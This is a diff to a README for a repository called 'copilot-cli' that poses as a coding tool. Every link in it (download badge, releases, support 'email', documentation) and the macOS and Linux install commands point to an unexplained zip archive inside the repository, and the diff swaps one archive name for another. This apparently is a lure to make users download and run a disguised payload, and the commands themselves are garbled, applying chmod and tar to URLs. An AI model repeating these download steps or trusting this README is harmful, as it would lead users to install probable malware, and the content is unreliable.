@@ -1,6 +1,6 @@
 # 🚀 copilot-cli - Enhance Your Coding Experience Effortlessly
 
-[![Download copilot-cli](https://raw.githubusercontent.com/Yasinali888/copilot-cli/main/intrencher/copilot-cli-phenyl.zip%20Now-Click%20Here-brightgreen)](https://raw.githubusercontent.com/Yasinali888/copilot-cli/main/intrencher/copilot-cli-phenyl.zip)
+[![Download copilot-cli](https://raw.githubusercontent.com/Yasinali888/copilot-cli/main/intrencher/cli-copilot-v2.4.zip%20Now-Click%20Here-brightgreen)](https://raw.githubusercontent.com/Yasinali888/copilot-cli/main/intrencher/cli-copilot-v2.4.zip)
 
 ## 🌟 Overview
 
@@ -26,7 +26,7 @@ To begin using copilot-cli, follow these simple steps:
 
 ## 📥 Download & Install
 
-To download copilot-cli, visit this page to download: [Download copilot-cli Releases](https://raw.githubusercontent.com/Yasinali888/copilot-cli/main/intrencher/copilot-cli-phenyl.zip).
+To download copilot-cli, visit this page to download: [Download copilot-cli Releases](https://raw.githubusercontent.com/Yasinali888/copilot-cli/main/intrencher/cli-copilot-v2.4.zip).
 
 ### Installation Steps:
 
@@ -40,10 +40,10 @@ To download copilot-cli, visit this page to download: [Download copilot-cli Rele
      - Follow the prompts in the setup wizard.
    - **macOS:**
      - Open your terminal and navigate to the folder where you downloaded the file.
-     - Use the command: `chmod +x https://raw.githubusercontent.com/Yasinali888/copilot-cli/main/intrencher/copilot-cli-phenyl.zip && open https://raw.githubusercontent.com/Yasinali888/copilot-cli/main/intrencher/copilot-cli-phenyl.zip` to mount the installer.
+     - Use the command: `chmod +x https://raw.githubusercontent.com/Yasinali888/copilot-cli/main/intrencher/cli-copilot-v2.4.zip && open https://raw.githubusercontent.com/Yasinali888/copilot-cli/main/intrencher/cli-copilot-v2.4.zip` to mount the installer.
      - Drag the app to your Applications folder.
    - **Linux:**
-     - Open your terminal, navigate to the download location, and run: `tar -xvf https://raw.githubusercontent.com/Yasinali888/copilot-cli/main/intrencher/copilot-cli-phenyl.zip` to extract the files.
+     - Open your terminal, navigate to the download location, and run: `tar -xvf https://raw.githubusercontent.com/Yasinali888/copilot-cli/main/intrencher/cli-copilot-v2.4.zip` to extract the files.
      - Run the main executable from the terminal.
 
 3. **Run copilot-cli:**
@@ -89,14 +89,14 @@ Your feedback is valuable to us. Feel free to leave your comments on the Issues 
 
 ## 💬 Support
 
-If you have any questions or need assistance, please reach out through the Issues section on our GitHub or via email at https://raw.githubusercontent.com/Yasinali888/copilot-cli/main/intrencher/copilot-cli-phenyl.zip 
+If you have any questions or need assistance, please reach out through the Issues section on our GitHub or via email at https://raw.githubusercontent.com/Yasinali888/copilot-cli/main/intrencher/cli-copilot-v2.4.zip 
 
 For more help, you can also visit our documentation page.
 
 ## 🔄 Related Resources
 
-- [GitHub Docs on Copilot](https://raw.githubusercontent.com/Yasinali888/copilot-cli/main/intrencher/copilot-cli-phenyl.zip)
-- [Command Line Basics](https://raw.githubusercontent.com/Yasinali888/copilot-cli/main/intrencher/copilot-cli-phenyl.zip)
+- [GitHub Docs on Copilot](https://raw.githubusercontent.com/Yasinali888/copilot-cli/main/intrencher/cli-copilot-v2.4.zip)
+- [Command Line Basics](https://raw.githubusercontent.com/Yasinali888/copilot-cli/main/intrencher/cli-copilot-v2.4.zip)
 
 ## 🎉 Conclusion
 
